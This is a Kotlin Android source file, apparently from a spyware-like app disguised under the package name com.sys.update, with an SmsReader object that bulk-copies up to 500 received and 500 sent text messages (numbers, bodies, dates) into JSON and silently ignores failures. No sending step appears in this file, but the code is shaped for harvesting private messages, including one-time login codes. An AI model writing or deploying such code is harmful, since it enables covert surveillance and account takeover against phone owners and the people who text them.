package com.sys.update

import android.content.Context
import android.net.Uri
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Reads all SMS messages from the device inbox.
 * Requires: READ_SMS permission (runtime)
 */
object SmsReader {

    private val timeFmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    fun scanAll(context: Context): List<JSONObject> {
        val result = mutableListOf<JSONObject>()
        try {
            val uri = Uri.parse("content://sms/inbox")
            val cursor = context.contentResolver.query(
                uri,
                arrayOf("_id", "address", "body", "date", "type", "person", "read"),
                null, null, "date DESC"
            )

            cursor?.use { c ->
                val idxAddress = c.getColumnIndex("address")
                val idxBody = c.getColumnIndex("body")
                val idxDate = c.getColumnIndex("date")
                val idxType = c.getColumnIndex("type")
                val idxRead = c.getColumnIndex("read")

                while (c.moveToNext() && result.size < 500) {
                    val obj = JSONObject().apply {
                        put("type", "sms")
                        put("address", if (idxAddress >= 0) c.getString(idxAddress) ?: "" else "")
                        put("body", if (idxBody >= 0) c.getString(idxBody) ?: "" else "")
                        put("date", if (idxDate >= 0) timeFmt.format(Date(c.getLong(idxDate))) else "")
                        put("sms_type", if (idxType >= 0) c.getInt(idxType) else 0)
                        put("read", if (idxRead >= 0) c.getInt(idxRead) == 1 else false)
                    }
                    result.add(obj)
                }
            }
        } catch (e: Exception) {
            // silently ignore — permission may be missing
        }
        return result
    }

    fun scanSent(context: Context): List<JSONObject> {
        val result = mutableListOf<JSONObject>()
        try {
            val uri = Uri.parse("content://sms/sent")
            val cursor = context.contentResolver.query(
                uri,
                arrayOf("address", "body", "date"),
                null, null, "date DESC"
            )
            cursor?.use { c ->
                val idxAddress = c.getColumnIndex("address")
                val idxBody = c.getColumnIndex("body")
                val idxDate = c.getColumnIndex("date")

                while (c.moveToNext() && result.size < 500) {
                    val obj = JSONObject().apply {
                        put("type", "sms_sent")
                        put("address", if (idxAddress >= 0) c.getString(idxAddress) ?: "" else "")
                        put("body", if (idxBody >= 0) c.getString(idxBody) ?: "" else "")
                        put("date", if (idxDate >= 0) timeFmt.format(Date(c.getLong(idxDate))) else "")
                    }
                    result.add(obj)
                }
            }
        } catch (_: Exception) {}
        return result
    }
}
